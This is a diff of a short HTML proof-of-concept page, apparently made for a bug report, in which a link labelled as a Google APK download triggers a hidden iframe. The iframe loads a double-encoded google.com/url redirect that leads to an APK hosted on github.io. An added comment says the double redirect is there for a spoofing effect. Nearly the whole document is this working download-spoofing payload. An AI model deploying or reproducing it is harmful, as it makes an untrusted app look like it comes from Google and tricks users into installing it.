@@ -1,7 +1,12 @@
 <a href="#" onclick="poc()">click me to download google apk</a>
 <script>
     function poc(){
-    document.getElementById("ifr").src="https://www.google.com/url?q=https://google.com/url?q%3Dhttps://ybt01.github.io/upload/app-debug.apk";
+        // Double Google URL redirect untuk effect spoofing
+        const spoofedUrl = "https://www.google.com/url?q=" + 
+                          encodeURIComponent("https://www.google.com/url?q=" + 
+                          encodeURIComponent("https://ybt01.github.io/upload/app-debug.apk"));
+        
+        document.getElementById("ifr").src = spoofedUrl;
     }
 </script>
 <iframe id="ifr" src style="display:none"></iframe>
